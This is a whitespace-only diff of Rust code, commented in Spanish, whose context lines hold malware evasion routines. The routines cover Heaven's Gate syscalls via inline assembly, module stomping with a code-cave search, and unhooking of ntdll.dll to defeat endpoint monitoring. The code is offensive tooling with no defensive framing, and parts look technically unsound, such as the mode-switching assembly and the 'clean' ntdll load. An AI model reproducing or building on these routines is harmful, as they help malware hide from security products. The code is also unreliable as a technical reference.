@@ -119,33 +119,33 @@ pub mod heavens_gate {
 
     /// Ejecuta syscall x86 desde proceso x64 (WoW64)
     pub unsafe fn execute_x86_syscall(syscall_num: u32, args: &[usize]) -> i32 {
-        // Esta técnica usa el segmento de código 0x23 (x86) 
+        // Esta técnica usa el segmento de código 0x23 (x86)
         // en lugar de 0x33 (x64) para ejecutar código 32-bit
-        
+
         let mut result: i32 = 0;
-        
+
         // Far jump a código x86
         asm!(
             "push 0x23",              // Push 32-bit code segment
             "call $+5",               // Get EIP
             "add dword ptr [rsp], 5", // Add offset
             "retf",                   // Far return to x86 mode
-            
+
             // Ahora estamos en x86 mode
             "mov eax, {syscall}",
             "int 0x2E",               // x86 syscall interrupt
-            
+
             // Volver a x64 mode
-            "push 0x33",              // Push 64-bit code segment  
+            "push 0x33",              // Push 64-bit code segment
             "call $+5",
             "add dword ptr [rsp], 5",
             "retf",
-            
+
             syscall = in(reg) syscall_num,
             out("eax") result,
             options(nostack)
         );
-        
+
         result
     }
 }
@@ -165,7 +165,7 @@ pub mod module_stomping {
         // Obtener handle del módulo target
         let module_name = CString::new(target_module)
             .map_err(|_| "Invalid module name")?;
-        
+
         let module_handle = GetModuleHandleA(module_name.as_ptr());
         if module_handle.is_null() {
             return Err("Module not found".to_string());
@@ -220,7 +220,7 @@ pub mod module_stomping {
 
         for offset in 0..0x100000 { // Buscar en primeros 1MB
             let byte = *module_base.add(offset);
-            
+
             if byte == 0x00 || byte == 0xCC {
                 if cave_size == 0 {
                     current = offset;
@@ -276,7 +276,7 @@ pub mod unhook {
         // Cargar una copia limpia de ntdll.dll desde disco
         let ntdll_name = CString::new("ntdll.dll")
             .map_err(|_| "Failed to create CString")?;
-        
+
         let clean_ntdll = LoadLibraryA(ntdll_name.as_ptr());
         if clean_ntdll.is_null() {
             return Err("Failed to load clean ntdll".to_string());
